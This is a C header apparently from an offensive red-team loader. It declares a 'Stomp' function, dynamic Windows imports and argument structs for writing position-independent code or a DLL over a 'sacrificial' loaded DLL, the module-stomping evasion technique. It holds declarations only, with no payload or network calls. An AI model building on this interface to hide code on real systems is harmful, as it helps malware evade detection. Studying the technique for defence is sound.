#pragma once
#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR, HANDLE, DWORD);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT NTSYSAPI BOOLEAN WINAPI KERNEL32$RtlAddFunctionTable(PRUNTIME_FUNCTION, DWORD, DWORD64);
DECLSPEC_IMPORT NTSYSAPI BOOLEAN WINAPI KERNEL32$RtlDeleteFunctionTable(PRUNTIME_FUNCTION);

typedef struct _PICO {
    char data[4096];
    char code[16384];
} PICO;

typedef enum {
    rPICO,
    rDLL,
} RESOURCE_TYPE;

typedef struct _PICO_ARGS {
    PICO**          pico_dst;
    IMPORTFUNCS*    funcs;
    char*           pico_src;
    const char*     sacrificialDll;
    RUNTIME_FUNCTION* pico_rf_storage; /* caller-alloc'd: MAX_PICO_FUNCS entries */
    int*            pico_rf_count;     /* out: number of entries written */
} PICO_ARGS, *PPICO_ARGS;

#define MAX_PICO_FUNCS 16

typedef struct _DLL_ARGS {
    DLLDATA*     dll_data;
    IMPORTFUNCS* funcs;
    char**       dll_src;
    char**       dll_dst;
    const char*  sacrificialDll;
} DLL_ARGS, *PDLL_ARGS;

typedef struct _STOMP_ARGS {
    RESOURCE_TYPE resourceType;
    union {
        PICO_ARGS picoArgs;
        DLL_ARGS  dllArgs;
    };
} STOMP_ARGS, *PSTOMP_ARGS;

BOOL Stomp(STOMP_ARGS stompArgs);